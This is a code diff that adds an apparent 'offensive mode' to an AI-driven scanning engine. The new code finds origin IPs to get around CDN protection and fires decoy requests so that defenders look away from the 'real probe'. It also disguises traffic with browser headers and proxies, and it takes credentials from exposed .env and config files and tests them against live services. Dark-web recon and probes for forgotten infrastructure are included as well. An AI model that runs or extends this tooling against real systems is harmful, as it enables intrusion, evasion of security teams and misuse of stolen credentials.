@@ -185,6 +185,27 @@ def _path_discovery_strategy(target: str, live_hosts: list[str]) -> ScanStrategy
     )
 
 
+def _forgotten_infra_strategy(target: str) -> ScanStrategy:
+    """Strategy 3b: Scan for forgotten infrastructure -- the doors nobody locked."""
+    return ScanStrategy(
+        name="forgotten_infrastructure",
+        description="Scan for forgotten services: Jenkins, Grafana, Sentry, Kibana, "
+                    "phpMyAdmin, Elasticsearch, Docker Registry, Jupyter, K8s Dashboard. "
+                    "These are services the team deployed once and forgot about.",
+        steps=[
+            {"operation": "_forgotten_infra_scan", "params": {"domain": target}},
+        ],
+        reasoning="The main site is hardened. But the Jenkins server from 2 years ago "
+                  "is still running with no auth. The Grafana dashboard has anonymous "
+                  "access. The Sentry instance leaks stack traces with file paths. "
+                  "These are the doors nobody locked because nobody remembers they exist. "
+                  "14 service types checked across 40+ paths/ports.",
+        confidence=0.55,
+        stealth_level="medium",
+        frameworks_used=["forgotten_infrastructure", "developer_empathy"],
+    )
+
+
 def _targeted_vuln_scan_strategy(target: str, technologies: list[str], cves: list[dict]) -> ScanStrategy:
     """Strategy 4: Targeted nuclei scan based on discovered tech stack."""
     # Build targeted template tags from discovered technologies
@@ -415,6 +436,68 @@ class CognitiveScanEngine:
                     thinking.append(f"  Previous strategy '{prev.strategy_name}' failed: {prev.failure_reason}")
                     thinking.append(f"  Open channels from constraint probe: {prev.open_channels}")
 
+            # ── ORIGIN IP DISCOVERY (/3vilbob: Unreplicable) ──
+            # When CDN/WAF is detected, try to find the real server IP.
+            # The CDN is the armor. The origin IP is the skin underneath.
+            # If we find it, we bypass ALL CDN protection in one step.
+            if self.offensive_mode and cycle_num == 1 and profile.waf_detected:
+                from app.services.cognition.unreplicable import OriginIPDiscovery
+                origin_disc = OriginIPDiscovery()
+                thinking.append(
+                    f"[ORIGIN IP] CDN detected ({profile.waf_detected}). "
+                    f"Attempting to find origin IP behind it..."
+                )
+
+                # Generate bypass subdomain targets
+                bypass_targets = origin_disc.generate_bypass_targets(target)
+                thinking.append(f"  Generated {len(bypass_targets)} bypass subdomain targets")
+
+                # Resolve bypass subdomains to find origin IPs
+                import asyncio
+                import socket
+                origin_candidates: list[dict[str, Any]] = []
+                for bt in bypass_targets[:20]:
+                    hostname = bt["hostname"]
+                    try:
+                        loop = asyncio.get_event_loop()
+                        addrs = await loop.run_in_executor(
+                            None, lambda h=hostname: socket.getaddrinfo(h, None)
+                        )
+                        resolved_ips = list(set(addr[4][0] for addr in addrs))
+                        if resolved_ips:
+                            origin_candidates.append({
+                                "hostname": hostname,
+                                "ips": resolved_ips,
+                                "category": bt["category"],
+                                "reason": bt["reason"],
+                            })
+                    except (socket.gaierror, OSError):
+                        continue
+
+                if origin_candidates:
+                    thinking.append(
+                        f"  Found {len(origin_candidates)} resolvable bypass subdomains:"
+                    )
+                    for oc in origin_candidates[:8]:
+                        thinking.append(
+                            f"    {oc['hostname']} -> {oc['ips']} [{oc['category']}]"
+                        )
+                    # Store origin candidates for strategy generation
+                    result.evidence_summary["origin_ip_candidates"] = origin_candidates
+                    # Add resolved subdomains to profile
+                    for oc in origin_candidates:
+                        if oc["hostname"] not in profile.subdomains:
+                            profile.subdomains.append(oc["hostname"])
+                else:
+                    thinking.append("  No bypass subdomains resolved. CDN coverage is tight.")
+
+                # Generate full origin discovery plan
+                origin_plan = origin_disc.generate_origin_check_plan(target, profile.waf_detected)
+                thinking.append(f"  Full origin discovery plan: {len(origin_plan)} steps")
+                for step in origin_plan:
+                    thinking.append(f"    {step['step']}: {step['reason']}")
+                result.evidence_summary["origin_discovery_plan"] = origin_plan
+
             # Classify target type
             # In offensive mode or when LLM available, use LLM-powered classification
             if self.offensive_mode or self._reasoner_initialized:
@@ -467,6 +550,66 @@ class CognitiveScanEngine:
                     "security_awareness": dev_profile.security_awareness,
                     "predictions": vuln_predictions[:10],
                 }
+
+            # ── PROTOCOL INTELLIGENCE (/3vilbob) ──────────────
+            # Deep protocol-level analysis: what protocols does this
+            # target use, and what are the attack surfaces at each layer?
+            if self.offensive_mode and cycle_num == 1:
+                from app.services.security.network_intelligence import (
+                    ProtocolKnowledgeBase, NetworkTopologyMapper, DarkWebRecon,
+                )
+                proto_kb = ProtocolKnowledgeBase()
+                topo_mapper = NetworkTopologyMapper()
+                darkweb = DarkWebRecon()
+
+                # Protocol attack surface analysis
+                proto_paths = proto_kb.generate_protocol_attack_surface(
+                    technologies=profile.technologies,
+                    target_profile={
+                        "waf_detected": profile.waf_detected,
+                        "http_version": profile.http_version,
+                        "target_type": profile.target_type,
+                        "defenses": profile.defenses,
+                    },
+                )
+                if proto_paths:
+                    thinking.append(
+                        f"[PROTOCOL INTEL] {len(proto_paths)} protocol-level attack surfaces identified:"
+                    )
+                    for pp in proto_paths[:6]:
+                        thinking.append(
+                            f"  [{pp.protocol}] {pp.weakness} "
+                            f"(confidence: {pp.confidence:.0%}, detection: {pp.detection_risk})"
+                        )
+                    result.evidence_summary["protocol_attack_surfaces"] = [
+                        {"protocol": p.protocol, "weakness": p.weakness, "confidence": p.confidence}
+                        for p in proto_paths
+                    ]
+
+                # Network topology inference
+                net_fp = topo_mapper.infer_topology(
+                    domain=target,
+                    subdomains=profile.subdomains,
+                    live_hosts=profile.live_hosts,
+                    response_headers=profile.response_headers,
+                )
+                thinking.append(
+                    f"[TOPOLOGY] {net_fp.network_topology} architecture, "
+                    f"CDN: {net_fp.cdn_provider or 'none'}, "
+                    f"hosting: {net_fp.hosting_provider or 'unknown'}, "
+                    f"OS: {net_fp.server_os or 'unknown'}, "
+                    f"IPs: {len(net_fp.ip_ranges)}"
+                )
+                egress = topo_mapper.identify_egress_paths(net_fp)
+                for eg in egress[:3]:
+                    thinking.append(f"  Egress: {eg}")
+
+                # Dark web recon plan
+                darkweb_plan = darkweb.generate_dark_web_recon_plan(target)
+                thinking.append(f"[DARK WEB] Recon plan: {len(darkweb_plan)} steps")
+                for step in darkweb_plan[:3]:
+                    thinking.append(f"  {step['step']}: {step['reason'][:80]}")
+                result.evidence_summary["darkweb_recon_plan"] = darkweb_plan
 
             # ── ORIENT (LLM-powered) ──────────────────────────
             # The CognitiveReasoner THINKS about the target using
@@ -685,6 +828,62 @@ class CognitiveScanEngine:
                             prediction,
                         )
 
+            # ── COGNITIVE DECEPTION (/3vilbob: Apex Cognition) ─
+            # Before the real probe, fire decoy requests to misdirect
+            # the defender's attention. While SOC investigates the
+            # obvious SQLi/brute-force decoy, the real probe is quiet.
+            if self.offensive_mode and strategy.stealth_level in ("medium", "high"):
+                from app.services.cognition.apex_cognition import CognitiveDeceptionEngine
+                deception = CognitiveDeceptionEngine()
+                deception_plan = deception.plan_deception(
+                    real_objective=strategy.description,
+                    target=target,
+                    defenses=profile.defenses,
+                )
+                thinking.append(
+                    f"[DECEPTION] Deploying {len(deception_plan.decoy_actions)} decoy requests "
+                    f"before real probe..."
+                )
+                thinking.append(f"  Timing: {deception_plan.timing}")
+                thinking.append(f"  Expected SOC response: {deception_plan.expected_defender_response[:120]}")
+
+                # Fire decoys asynchronously
+                import asyncio
+                import httpx as _httpx
+                req_headers = (
+                    self._proxy_manager.get_request_headers()
+                    if self._proxy_manager
+                    else {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
+                )
+                deception_proxy = self._resolve_proxy()
+                try:
+                    async with _httpx.AsyncClient(
+                        timeout=5.0,
+                        follow_redirects=False,
+                        verify=False,
+                        proxy=deception_proxy or None,
+                    ) as decoy_client:
+                        for decoy in deception_plan.decoy_actions:
+                            delay_ms = decoy.get("delay_before_ms", 0)
+                            if delay_ms > 0:
+                                await asyncio.sleep(delay_ms / 1000.0)
+                            try:
+                                method = decoy.get("method", "GET")
+                                decoy_url = decoy["url"]
+                                if method == "POST":
+                                    await decoy_client.post(
+                                        decoy_url,
+                                        content=decoy.get("body", ""),
+                                        headers=req_headers,
+                                    )
+                                else:
+                                    await decoy_client.get(decoy_url, headers=req_headers)
+                                thinking.append(f"  Decoy fired: {method} {decoy_url} [{decoy.get('purpose', '')[:50]}]")
+                            except Exception:
+                                pass  # Decoys are expendable
+                except Exception:
+                    pass  # Deception is best-effort
+
             # ── ACT ────────────────────────────────────────────
             thinking.append(f"[ACT] Executing '{strategy.name}'...")
             cycle_result = ScanCycleResult(
@@ -738,6 +937,73 @@ class CognitiveScanEngine:
                         await self._capture_finding_evidence(finding, agent)
                     except Exception as exc:
                         thinking.append(f"  Evidence capture error: {str(exc)[:100]}")
+
+            # ── CREDENTIAL EXTRACTION CHAIN (/3vilbob mode) ───
+            # When we find .env, config files, or exposed secrets,
+            # don't just report "file found" -- extract credentials,
+            # test connectivity, and prove data access.
+            if self.offensive_mode and step_findings:
+                credential_findings = [
+                    f for f in step_findings
+                    if any(p in str(f.get("url", "")).lower()
+                           for p in ("/.env", "/.git/", "/config", "docker-compose", ".json"))
+                    and f.get("status_code") == 200
+                ]
+                if credential_findings:
+                    from app.services.security.credential_chain import CredentialExtractionChain
+                    cred_chain = CredentialExtractionChain()
+                    thinking.append(
+                        f"[CRED CHAIN] {len(credential_findings)} config files found. "
+                        f"Extracting credentials and testing connectivity..."
+                    )
+                    for cf in credential_findings[:3]:
+                        cf_url = cf.get("url", "")
+                        # Re-fetch the file content for parsing
+                        try:
+                            import httpx as _hx
+                            req_h = (
+                                self._proxy_manager.get_request_headers()
+                                if self._proxy_manager
+                                else {"User-Agent": "Mozilla/5.0"}
+                            )
+                            async with _hx.AsyncClient(
+                                timeout=10.0, verify=False,
+                                proxy=self._resolve_proxy() or None,
+                            ) as _client:
+                                resp = await _client.get(cf_url, headers=req_h)
+                                if resp.status_code == 200 and len(resp.text) > 10:
+                                    chain_result = await cred_chain.execute(
+                                        content=resp.text,
+                                        source_url=cf_url,
+                                    )
+                                    thinking.extend(chain_result.thinking)
+
+                                    if chain_result.successful_connections > 0:
+                                        # Add as critical finding
+                                        step_findings.append({
+                                            "type": "credential_chain",
+                                            "url": cf_url,
+                                            "info": {
+                                                "name": f"Credential Chain: {chain_result.total_impact[:80]}",
+                                                "severity": "critical",
+                                                "description": chain_result.total_impact,
+                                            },
+                                            "credentials_found": chain_result.credentials_found,
+                                            "connections_succeeded": chain_result.successful_connections,
+                                        })
+                                    elif chain_result.credentials_found > 0:
+                                        step_findings.append({
+                                            "type": "credential_extraction",
+                                            "url": cf_url,
+                                            "info": {
+                                                "name": f"Credentials Extracted: {chain_result.credentials_found} from {cf_url}",
+                                                "severity": "high",
+                                                "description": chain_result.total_impact,
+                                            },
+                                            "credentials_found": chain_result.credentials_found,
+                                        })
+                        except Exception as exc:
+                            thinking.append(f"  Cred chain failed for {cf_url}: {str(exc)[:100]}")
 
             # ── AUTO-EXPLOIT CHAIN (/3vilbob mode) ────────────
             # A scanner REPORTS. Daena PROVES IMPACT.
@@ -917,9 +1183,9 @@ class CognitiveScanEngine:
                             for impl in abd.implications[:2]:
                                 thinking.append(f"      -> {impl}")
 
-                    # ── HYPOTHESIS GENERATION (Apex Cognition) ────
+                    # ── HYPOTHESIS GENERATION + TESTING (Apex Cognition) ─
                     # Scientific method: generate testable hypotheses
-                    # from what we've observed so far.
+                    # from observations, then TEST them in ACT phase.
                     from app.services.cognition.apex_cognition import HypothesisTester
                     hyp_tester = HypothesisTester()
                     obs_for_hyp = {
@@ -930,10 +1196,88 @@ class CognitiveScanEngine:
                     }
                     hypotheses = hyp_tester.generate_hypotheses(obs_for_hyp)
                     if hypotheses:
-                        thinking.append(f"[HYPOTHESES] {len(hypotheses)} testable hypotheses generated:")
-                        for hyp in hypotheses[:3]:
-                            thinking.append(f"    H: {hyp.statement}")
-                            thinking.append(f"    Prediction: {hyp.prediction}")
+                        thinking.append(f"[HYPOTHESES] {len(hypotheses)} testable hypotheses generated. Testing...")
+
+                        # Execute hypothesis tests
+                        import httpx as _hx2
+                        req_h2 = (
+                            self._proxy_manager.get_request_headers()
+                            if self._proxy_manager
+                            else {"User-Agent": "Mozilla/5.0"}
+                        )
+                        _proxy2 = self._resolve_proxy()
+                        try:
+                            async with _hx2.AsyncClient(
+                                timeout=8.0, verify=False,
+                                follow_redirects=False,
+                                proxy=_proxy2 or None,
+                            ) as hyp_client:
+                                for hyp in hypotheses[:5]:
+                                    test = hyp.test_action
+                                    op = test.get("op", "")
+                                    params = test.get("params", {})
+
+                                    if op == "http_request":
+                                        path = params.get("path", "/")
+                                        method = params.get("method", "GET")
+                                        test_url = f"https://{target}{path}"
+                                        headers = {**req_h2, **params.get("headers", {})}
+                                        body = params.get("body", "")
+
+                                        try:
+                                            if method == "POST":
+                                                resp = await hyp_client.post(
+                                                    test_url, content=body, headers=headers,
+                                                )
+                                            else:
+                                                resp = await hyp_client.get(
+                                                    test_url, headers=headers,
+                                                )
+
+                                            test_result = {
+                                                "status_code": resp.status_code,
+                                                "success": resp.status_code < 500,
+                                                "body": resp.text[:500],
+                                            }
+                                            hyp = hyp_tester.update_hypothesis(hyp, test_result)
+
+                                            status_icon = {
+                                                "confirmed": "CONFIRMED",
+                                                "refuted": "REFUTED",
+                                                "partial": "PARTIAL",
+                                            }.get(hyp.result, "INCONCLUSIVE")
+                                            thinking.append(
+                                                f"    [{status_icon}] H: {hyp.statement} "
+                                                f"({resp.status_code}) conf: {hyp.confidence_before:.0%} -> {hyp.confidence_after:.0%}"
+                                            )
+
+                                            # Confirmed hypothesis -> new finding
+                                            if hyp.result == "confirmed":
+                                                step_findings.append({
+                                                    "type": "hypothesis_confirmed",
+                                                    "url": test_url,
+                                                    "status_code": resp.status_code,
+                                                    "info": {
+                                                        "name": f"Hypothesis Confirmed: {hyp.statement}",
+                                                        "severity": "medium",
+                                                        "description": (
+                                                            f"Hypothesis: {hyp.statement}. "
+                                                            f"Prediction: {hyp.prediction}. "
+                                                            f"Result: confirmed ({resp.status_code}). "
+                                                            f"Implications: {'; '.join(hyp.spawned_hypotheses[:3])}"
+                                                        ),
+                                                    },
+                                                })
+                                                # Spawn new hypotheses from confirmation
+                                                for spawned in hyp.spawned_hypotheses:
+                                                    thinking.append(f"      -> Spawned: {spawned}")
+
+                                        except Exception:
+                                            thinking.append(f"    [ERROR] H: {hyp.statement} -- test failed")
+                                    else:
+                                        thinking.append(f"    [SKIP] H: {hyp.statement} -- test type '{op}' not yet implemented")
+                        except Exception:
+                            thinking.append("    Hypothesis testing client failed")
 
             cycle_result.thinking = thinking
             cycle_results.append(cycle_result)
@@ -1417,6 +1761,10 @@ class CognitiveScanEngine:
             live_urls = [h.get("url", "") for h in profile.live_hosts if h.get("url")]
             strategies.append(_path_discovery_strategy(target, live_urls))
 
+        # Forgotten infrastructure scan (/3vilbob mode)
+        if self.offensive_mode:
+            strategies.append(_forgotten_infra_strategy(target))
+
         # Targeted vuln scan -- only after we know the stack
         strategies.append(_targeted_vuln_scan_strategy(
             target, profile.technologies, profile.cve_intel,
@@ -1523,7 +1871,7 @@ class CognitiveScanEngine:
                 logger.debug("cognitive_scan.novel_strategy_gen_failed", error=str(exc)[:200])
 
         # Reorder based on target type (template strategies first, novel after)
-        template_names = {"passive_osint", "header_analysis", "path_discovery", "targeted_vuln_scan"}
+        template_names = {"passive_osint", "header_analysis", "path_discovery", "targeted_vuln_scan", "forgotten_infrastructure"}
         if profile.target_type == "hardened_cloud":
             order = {"passive_osint": 0, "header_analysis": 1, "path_discovery": 2, "targeted_vuln_scan": 3}
         elif profile.target_type == "waf_protected":
@@ -1604,6 +1952,10 @@ class CognitiveScanEngine:
         elif operation == "_api_discovery":
             # Check for exposed API documentation
             return await self._api_discovery(params.get("target", ""), agent)
+
+        elif operation == "_forgotten_infra_scan":
+            # Scan for forgotten infrastructure services
+            return await self._forgotten_infra_scan(params.get("domain", ""))
 
         return {"summary": f"Internal operation {operation} not implemented yet", "findings": []}
 
@@ -1819,6 +2171,108 @@ class CognitiveScanEngine:
         # This is covered by _path_fuzz for now -- can be extended
         # with more sophisticated API discovery (GraphQL introspection, etc.)
         return {"summary": "API discovery: see path_fuzz results", "findings": []}
+
+    async def _forgotten_infra_scan(self, domain: str) -> dict[str, Any]:
+        """Scan for forgotten infrastructure services.
+
+        Jenkins, Grafana, Sentry, Kibana, phpMyAdmin, Elasticsearch,
+        Docker Registry, K8s Dashboard, Jupyter, RabbitMQ, MinIO, Redis Commander.
+
+        These are the doors nobody locked because nobody remembers they exist.
+        """
+        from app.services.cognition.unreplicable import ForgottenInfraScanner
+        import httpx
+
+        scanner = ForgottenInfraScanner()
+        probes = scanner.generate_forgotten_probes(domain)
+        findings: list[dict[str, Any]] = []
+
+        # Use legitimacy mimicry headers
+        req_headers = (
+            self._proxy_manager.get_request_headers()
+            if self._proxy_manager
+            else {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
+        )
+        proxy = self._resolve_proxy()
+
+        try:
+            async with httpx.AsyncClient(
+                timeout=8.0,
+                follow_redirects=False,
+                verify=False,
+                proxy=proxy or None,
+            ) as client:
+                for probe in probes:
+                    if probe["type"] == "path":
+                        url = probe["url"]
+                        try:
+                            resp = await client.get(url, headers=req_headers)
+                            result = scanner.analyze_probe_result(
+                                probe,
+                                status_code=resp.status_code,
+                                body=resp.text[:2000],
+                                headers=dict(resp.headers),
+                            )
+                            if result:
+                                findings.append(result)
+                        except Exception:
+                            continue
+                    elif probe["type"] == "port":
+                        # Port-based probe -- TCP connect check
+                        import asyncio
+                        import socket
+                        host = probe.get("host", domain)
+                        port = probe.get("port", 0)
+                        if port:
+                            try:
+                                loop = asyncio.get_event_loop()
+                                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                                sock.settimeout(3.0)
+                                connected = await loop.run_in_executor(
+                                    None, lambda: sock.connect_ex((host, port))
+                                )
+                                if connected == 0:
+                                    # Port open -- try HTTP on it
+                                    try:
+                                        port_url = f"http://{host}:{port}{probe.get('path', '/')}"
+                                        resp = await client.get(port_url, headers=req_headers)
+                                        result = scanner.analyze_probe_result(
+                                            probe,
+                                            status_code=resp.status_code,
+                                            body=resp.text[:2000],
+                                            headers=dict(resp.headers),
+                                        )
+                                        if result:
+                                            findings.append(result)
+                                    except Exception:
+                                        # Port open but not HTTP
+                                        findings.append({
+                                            "type": "forgotten_infrastructure",
+                                            "service": probe["service"],
+                                            "url": f"{host}:{port}",
+                                            "severity": "medium",
+                                            "info": {
+                                                "name": f"Open port: {probe['service']} ({port})",
+                                                "severity": "medium",
+                                                "description": (
+                                                    f"Port {port} open on {host}, associated with "
+                                                    f"{probe['service']}. Risk: {probe['risk']}"
+                                                ),
+                                            },
+                                        })
+                                sock.close()
+                            except Exception:
+                                continue
+        except Exception as exc:
+            return {
+                "summary": f"Forgotten infra scan failed: {str(exc)[:100]}",
+                "findings": [],
+            }
+
+        return {
+            "summary": f"Forgotten infra scan: {len(findings)} services found out of {len(probes)} probes",
+            "findings": findings,
+        }
 
     async def _capture_finding_evidence(
         self,
